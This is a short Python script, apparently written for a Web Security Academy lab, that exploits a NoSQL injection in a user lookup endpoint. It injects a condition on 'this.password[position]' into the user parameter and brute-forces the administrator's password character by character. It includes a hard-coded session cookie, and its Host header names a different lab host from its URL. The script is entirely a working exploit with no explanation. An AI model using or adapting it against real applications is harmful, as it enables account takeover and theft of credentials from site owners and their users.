import requests

url = "https://0a2d006c03079f308028f342004500a9.web-security-academy.net/user/lookup"
session_cookie = "rcBEAQBxumuFImoCjfv8cxNvMqajUZeC"
known_password = ""


def is_correct_char(position, char):
    payload = f"administrator'&&this.password[{position}]=='{char}"
    headers = {
        "Host": "0ab90089032d0c7e808530fb006600e2.web-security-academy.net",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": "https://0ab90089032d0c7e808530fb006600e2.web-security-academy.net/my-account?id=wiener",
        "Connection": "keep-alive",
        "Cookie": f"session={session_cookie}",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=4"
    }
    response = requests.get(url, params={"user": payload}, headers=headers)
    # Adjusted condition based on the actual response
    return "administrator" in response.text


def brute_force_password():
    global known_password
    fail_qt = 0
    possible_chars = "abcdefghijklmnopqrstuvwxyz"
    for position in range(len(known_password), 20):
        for char in possible_chars:
            if is_correct_char(position, char):
                known_password += char
                print(f"Password so far: {known_password}")
                fail_qt = 0
                break
            else:
                fail_qt += 1
                if fail_qt == len(possible_chars):
                    return


if __name__ == "__main__":
    brute_force_password()
    print(f"Final password: {known_password}")
